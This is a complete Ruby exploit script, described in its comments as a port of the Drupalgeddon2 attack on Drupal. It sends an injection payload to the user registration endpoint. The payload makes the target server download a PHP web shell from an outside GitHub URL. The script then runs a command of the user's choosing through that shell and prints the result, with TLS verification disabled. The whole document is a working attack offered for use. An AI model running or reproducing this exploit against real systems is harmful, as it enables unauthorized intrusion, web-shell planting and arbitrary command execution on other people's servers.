require 'net/http'

# Hans Topo ruby port from Drupalggedon2 exploit.
# Based on Vitalii Rudnykh exploit

target = ARGV[0]
command = ARGV[1]

url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'

shell = "<?php system($_GET['cmd']); ?>"

payload = 'mail%5B%23markup%5D%3Dwget%20https%3A%2F%2Fraw.githubusercontent.com%2Fdreadlocked%2FDrupalgeddon2%2Fmaster%2Fsh.php%26mail%5B%23type%5D%3Dmarkup%26form_id%3Duser_register_form%26_drupal_ajax%3D1%26mail%5B%23post_render%5D%5B%5D%3Dexec'

uri = URI(url)

http = Net::HTTP.new(uri.host,uri.port)

if uri.scheme == 'https'
	http.use_ssl = true
	http.verify_mode = OpenSSL::SSL::VERIFY_NONE
end

req = Net::HTTP::Post.new(uri.path)
req.body = payload

response = http.request(req)

if response.code != "200"
	puts "[*] Response: " + response.code
	puts "[*] Target seems not to be exploitable"
	exit
end

puts "[*] Target seems to be exploitable."

exploit_uri = URI(target+"/sh.php?cmd=#{command}")
response = Net::HTTP.get_response(exploit_uri)
puts response.body